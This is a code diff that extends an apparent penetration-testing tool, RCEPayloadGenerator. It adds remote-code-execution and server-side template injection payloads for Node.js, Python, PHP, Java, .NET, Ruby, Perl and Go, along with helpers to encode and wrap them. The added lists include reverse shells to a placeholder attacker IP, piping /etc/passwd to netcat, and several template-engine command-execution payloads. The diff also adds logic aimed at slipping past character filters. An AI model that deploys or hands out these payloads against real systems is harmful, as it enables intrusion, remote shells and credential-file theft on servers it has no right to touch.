@@ -48,7 +48,38 @@ class RCEPayloadGenerator:
             "javascript": [";", ","],
         }
 
-        # Common payloads by environment and category
+        # Sink-specific constraints (forbidden chars, requirements)
+        self.sink_constraints: Dict[str, Dict[str, Any]] = {
+            # General OS command sinks
+            "unix_os_command": {"forbidden_chars": [";", "|", "&", "`", "(", ")"], "requires_quotes": False},
+            "windows_os_command": {"forbidden_chars": ["&", "|", "^", "<", ">"], "requires_quotes": False},
+            # Node.js sinks
+            "nodejs_child_process_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
+            "nodejs_pug_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
+            "nodejs_ejs_ssti": {"forbidden_chars": ["<%", "%>"], "requires_quotes": False},
+            "nodejs_handlebars_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
+            # Python sinks
+            "python_os_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
+            "python_jinja2_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
+            # PHP sinks
+            "php_exec_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
+            # Java sinks
+            "java_runtime_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
+            "java_freemarker_ssti": {"forbidden_chars": ["${", "}"], "requires_quotes": False},
+            "java_velocity_ssti": {"forbidden_chars": ["#", "$"], "requires_quotes": False},
+            "java_thymeleaf_ssti": {"forbidden_chars": ["[[", "]]"], "requires_quotes": False},
+            # .NET sinks
+            "dotnet_process_start": {"forbidden_chars": ["&", "|"], "requires_quotes": True},
+            # Ruby sinks
+            "ruby_kernel_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
+            "ruby_erb_ssti": {"forbidden_chars": ["<%", "%>"], "requires_quotes": False},
+            # Perl sinks
+            "perl_system_backticks": {"forbidden_chars": [";", "|"], "requires_quotes": True},
+            # Go sinks
+            "go_os_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
+        }
+
+        # Common payloads by category, now with sink-level granularity in code_execution
         self.payload_categories = {
             "basic_enum": {
                 "unix": ["id", "whoami", "uname -a", "pwd", "ls -la", "ps aux"],
@@ -71,19 +102,107 @@ class RCEPayloadGenerator:
                 "windows": ["ipconfig /all", "netstat -ano", "arp -a", "ping -n 4 127.0.0.1"],
             },
             "code_execution": {
-                "php": [
-                    "system('whoami')", "exec('whoami')", "shell_exec('whoami')",
-                    "passthru('whoami')", "eval('system(\\\"whoami\\\")')"
-                ],
-                "python": [
-                    "os.system('whoami')", "subprocess.call(['whoami'], shell=True)",
-                    "exec('import os; os.system(\\\"whoami\\\")')"
-                ],
-                "java": [
-                    "Runtime.getRuntime().exec(\"whoami\")",
-                    "new ProcessBuilder(\"whoami\").start()"
-                ],
-                "javascript": [
+                "nodejs": {
+                    "child_process_exec": [
+                        "require('child_process').exec('whoami')",
+                        "require('child_process').exec('cat /etc/passwd | nc {attacker_ip} 443')",
+                        "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{attacker_ip}/443 0>&1\"')",
+                    ],
+                    "pug_ssti": [
+                        "= 7 * 7",
+                        "= require('child_process').exec('whoami')",
+                    ],
+                    "ejs_ssti": [
+                        "<%= 7 * 7 %>",
+                        "<%= require('child_process').exec('whoami') %>",
+                    ],
+                    "handlebars_ssti": [
+                        "{{7 * 7}}",
+                        "{{lookup (lookup (lookup (lookup __proto__ 'constructor') 'constructor') 'call') 'whoami'}}",  # Simplified example
+                    ],
+                },
+                "python": {
+                    "os_system": [
+                        "os.system('whoami')",
+                        "os.system('cat /etc/passwd')",
+                        "os.system('bash -i >& /dev/tcp/{attacker_ip}/443 0>&1')",
+                    ],
+                    "subprocess": [
+                        "subprocess.call(['whoami'], shell=True)",
+                        "subprocess.Popen('cat /etc/passwd', shell=True).communicate()",
+                    ],
+                    "jinja2_ssti": [
+                        "{{7*7}}",
+                        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+                        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
+                        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
+                    ],
+                },
+                "php": {
+                    "exec_system": [
+                        "system('whoami')",
+                        "exec('whoami')",
+                        "shell_exec('whoami')",
+                        "passthru('whoami')",
+                        "eval('system(\"whoami\")')",
+                        "preg_replace('/.*/e','system(\"whoami\")','')",  # Legacy /e modifier
+                    ],
+                },
+                "java": {
+                    "runtime_exec": [
+                        "Runtime.getRuntime().exec(\"whoami\")",
+                        "new ProcessBuilder(\"whoami\").start()",
+                        "Runtime.getRuntime().exec(\"cat /etc/passwd\")",
+                    ],
+                    "freemarker_ssti": [
+                        "${7*7}",
+                        "${'freemarker.template.utility.Execute'?new()('id')}",
+                        "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id')}",
+                    ],
+                    "velocity_ssti": [
+                        "#set($x='') $x",
+                        "#set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $d=$ex.getInputStream() $d=$chr.toChars($d.readBytes($d.available())) $out=$str.valueOf($d) $out",
+                    ],
+                    "thymeleaf_ssti": [
+                        "[[${7*7}]]",
+                        "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
+                    ],
+                },
+                "dotnet": {
+                    "process_start": [
+                        "Process.Start(\"whoami.exe\")",
+                        "Process.Start(\"cmd.exe\", \"/c whoami\")",
+                        "new Process { StartInfo = new ProcessStartInfo { FileName = \"cmd.exe\", Arguments = \"/c whoami\" } }.Start()",
+                    ],
+                },
+                "ruby": {
+                    "kernel_system": [
+                        "system('whoami')",
+                        "`whoami`",
+                        "Kernel.system('whoami')",
+                        "Kernel.exec('whoami')",
+                    ],
+                    "erb_ssti": [
+                        "<%= 7 * 7 %>",
+                        "<%= `whoami` %>",
+                        "<%= File.open('/etc/passwd').read %>",
+                    ],
+                },
+                "perl": {
+                    "system_backticks": [
+                        "system('whoami')",
+                        "`whoami`",
+                        "exec('whoami')",
+                    ],
+                },
+                "go": {
+                    "os_exec": [
+                        "exec.Command(\"whoami\").Output()",
+                        "exec.Command(\"bash\", \"-c\", \"whoami\").Output()",
+                        "exec.Command(\"cat\", \"/etc/passwd\").Output()",
+                    ],
+                },
+                "javascript": [  # Legacy, kept for compatibility
                     "require('child_process').exec('whoami')",
                     "eval(\"require('child_process').exec('whoami')\")"
                 ],
@@ -133,6 +252,25 @@ class RCEPayloadGenerator:
             result.append(char)
         return ''.join(result)
 
+    def apply_constraints(self, payload: str, sink: str) -> str:
+        """Apply sink-specific constraints to payload"""
+        if sink not in self.sink_constraints:
+            return payload
+        
+        constraints = self.sink_constraints[sink]
+        forbidden = constraints.get('forbidden_chars', [])
+        
+        # Simple replacement for forbidden chars (e.g., encode them)
+        for char in forbidden:
+            if char in payload:
+                # Replace with URL-encoded version as example
+                payload = payload.replace(char, urllib.parse.quote(char))
+        
+        if constraints.get('requires_quotes', False):
+            payload = f'"{payload}"'
+        
+        return payload
+
     def generate_payloads(self, selected_contexts: List[str] = None, 
                          selected_categories: List[str] = None,
                          selected_encodings: List[str] = None,
@@ -155,7 +293,7 @@ class RCEPayloadGenerator:
         contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
         categories = selected_categories if selected_categories else list(self.payload_categories.keys())
         encodings = selected_encodings if selected_encodings else list(self.encoding_methods.keys())
-        environments = selected_environments if selected_environments else ["unix", "windows", "php", "python", "java", "javascript"]
+        environments = selected_environments if selected_environments else ["unix", "windows", "nodejs", "python", "php", "java", "dotnet", "ruby", "perl", "go", "javascript"]
         
         logger.info(f"Generating payloads for contexts: {contexts}, categories: {categories}, "
                    f"encodings: {encodings}, environments: {environments}")
@@ -177,60 +315,52 @@ class RCEPayloadGenerator:
                 for env in environments:
                     if env not in category:
                         continue
-                        
-                    for payload in category[env]:
-                        # Replace placeholders
-                        formatted_payload = payload.format(
-                            attacker_ip=self.attacker_ip,
-                            attacker_domain=self.attacker_domain
-                        )
-                        
-                        # Add environment-specific separators
-                        if env in self.separators:
-                            for sep in self.separators[env]:
-                                # Basic payload with separator
-                                full_payload = f"{sep}{formatted_payload}"
-                                
-                                # Apply selected encoding methods
-                                for enc_name in encodings:
-                                    if enc_name not in self.encoding_methods:
-                                        logger.warning(f"Unknown encoding: {enc_name}")
-                                        continue
-                                        
-                                    try:
-                                        enc_func = self.encoding_methods[enc_name]
-                                        encoded_payload = enc_func(full_payload)
-                                        
-                                        # Wrap in context
-                                        wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
-                                        
-                                        # Add to results if not already present
-                                        if wrapped_payload not in generated_payloads:
-                                            generated_payloads.add(wrapped_payload)
-                                            yield wrapped_payload
-                                    except Exception as e:
-                                        logger.error(f"Error encoding payload: {e}")
-                                        continue
-                        
-                        # Also add payload without separator
-                        for enc_name in encodings:
-                            if enc_name not in self.encoding_methods:
-                                continue
-                                
-                            try:
-                                enc_func = self.encoding_methods[enc_name]
-                                encoded_payload = enc_func(formatted_payload)
-                                
-                                # Wrap in context
-                                wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
-                                
-                                # Add to results if not already present
-                                if wrapped_payload not in generated_payloads:
-                                    generated_payloads.add(wrapped_payload)
+                    
+                    env_payloads = category[env]
+                    if isinstance(env_payloads, dict):  # For code_execution with sinks
+                        for sink, payloads in env_payloads.items():
+                            sink_key = f"{env}_{sink.replace('.', '_')}"  # Normalize sink key for constraints
+                            for base_payload in payloads:
+                                constrained_payload = self.apply_constraints(base_payload, sink_key)
+                                for wrapped_payload in self._generate_variations(constrained_payload, context, env, encodings, generated_payloads):
                                     yield wrapped_payload
-                            except Exception as e:
-                                logger.error(f"Error encoding payload: {e}")
-                                continue
+                    else:  # For other categories
+                        for base_payload in env_payloads:
+                            for wrapped_payload in self._generate_variations(base_payload, context, env, encodings, generated_payloads):
+                                yield wrapped_payload
+
+    def _generate_variations(self, base_payload: str, context: Dict, env: str, encodings: List[str], generated_payloads: Set[str]) -> Iterator[str]:
+        """Helper to generate payload variations with separators and encodings"""
+        formatted_payload = base_payload.replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)
+        
+        # Add with separators
+        if env in self.separators:
+            for sep in self.separators[env]:
+                full_payload = f"{sep}{formatted_payload}"
+                for wrapped_payload in self._encode_and_wrap(full_payload, context, encodings, generated_payloads):
+                    yield wrapped_payload
+        
+        # Add without separator
+        for wrapped_payload in self._encode_and_wrap(formatted_payload, context, encodings, generated_payloads):
+            yield wrapped_payload
+
+    def _encode_and_wrap(self, payload: str, context: Dict, encodings: List[str], generated_payloads: Set[str]) -> Iterator[str]:
+        """Apply encodings and context wrapping"""
+        for enc_name in encodings:
+            if enc_name not in self.encoding_methods:
+                continue
+                
+            try:
+                enc_func = self.encoding_methods[enc_name]
+                encoded_payload = enc_func(payload)
+                
+                wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
+                
+                if wrapped_payload not in generated_payloads:
+                    generated_payloads.add(wrapped_payload)
+                    yield wrapped_payload
+            except Exception as e:
+                logger.error(f"Error encoding payload: {e}")
 
     def save_payloads_to_file(self, file_path: str, max_payloads: int = None, **kwargs) -> int:
         """
